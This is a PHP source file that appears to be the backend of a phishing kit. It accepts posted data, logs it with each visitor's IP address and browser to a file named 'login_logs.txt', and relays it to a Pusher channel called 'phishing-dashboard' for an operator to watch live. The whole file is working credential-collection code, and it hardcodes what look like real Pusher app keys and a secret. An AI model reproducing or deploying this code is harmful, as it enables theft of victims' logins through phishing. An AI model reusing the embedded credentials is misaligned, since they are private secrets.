<?php
// Load Composer autoloader
require_once 'vendor/autoload.php';

// Set headers
header('Content-Type: application/json');
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: POST, GET, OPTIONS');
header('Access-Control-Allow-Headers: Content-Type');

// Handle preflight OPTIONS request
if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
    http_response_code(200);
    exit();
}

// Only allow POST requests
if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    http_response_code(405);
    echo json_encode(['error' => 'Method not allowed']);
    exit();
}

// Get JSON input
$input = json_decode(file_get_contents('php://input'), true);

if (!$input) {
    http_response_code(400);
    echo json_encode(['error' => 'Invalid JSON input']);
    exit();
}

// Pusher configuration
$pusherConfig = [
    'app_id' => '2056311',
    'key' => '049ee983c4ec4cecf834',
    'secret' => '6ee5cb53d3b09e78a6a1',
    'cluster' => 'ap1',
    'useTLS' => true
];

// Function to send data to Pusher using PHP SDK
function sendToPusher($channel, $event, $data, $config) {
    try {
        // Initialize Pusher client
        $pusher = new Pusher\Pusher(
            $config['key'],
            $config['secret'],
            $config['app_id'],
            [
                'cluster' => $config['cluster'],
                'useTLS' => $config['useTLS'],
                'timeout' => 10
            ]
        );
        
        // Send the event
        $result = $pusher->trigger($channel, $event, $data);
        
        return [
            'success' => true,
            'response' => json_encode($result),
            'http_code' => 200,
            'error' => null
        ];
        
    } catch (Exception $e) {
        return [
            'success' => false,
            'response' => $e->getMessage(),
            'http_code' => 500,
            'error' => $e->getMessage()
        ];
    }
}

// Function to log data to file (for debugging)
function logData($data) {
    $logFile = 'login_logs.txt';
    $timestamp = date('Y-m-d H:i:s');
    $logEntry = "[$timestamp] " . json_encode($data) . "\n";
    file_put_contents($logFile, $logEntry, FILE_APPEND | LOCK_EX);
}

try {
    // Validate required fields
    if (!isset($input['type']) || !isset($input['data'])) {
        throw new Exception('Missing required fields: type and data');
    }
    
    $type = $input['type'];
    $data = $input['data'];
    
    // Log the received data
    logData([
        'type' => $type,
        'data' => $data,
        'ip' => $_SERVER['REMOTE_ADDR'] ?? 'unknown',
        'user_agent' => $_SERVER['HTTP_USER_AGENT'] ?? 'unknown'
    ]);
    
    // Send to Pusher
    $result = sendToPusher('phishing-dashboard', $type, $data, $pusherConfig);
    
    if ($result['success']) {
        echo json_encode([
            'success' => true,
            'message' => 'Data sent to dashboard successfully',
            'pusher_response' => $result['response']
        ]);
    } else {
        // Log the error
        logData([
            'error' => 'Pusher send failed',
            'http_code' => $result['http_code'],
            'response' => $result['response'],
            'curl_error' => $result['error']
        ]);
        
        // Still return success to frontend, but log the Pusher error
        echo json_encode([
            'success' => true,
            'message' => 'Data logged successfully (Pusher may be offline)',
            'pusher_error' => $result['response']
        ]);
    }
    
} catch (Exception $e) {
    // Log the error
    logData([
        'error' => $e->getMessage(),
        'trace' => $e->getTraceAsString()
    ]);
    
    http_response_code(500);
    echo json_encode([
        'success' => false,
        'error' => $e->getMessage()
    ]);
}
?>
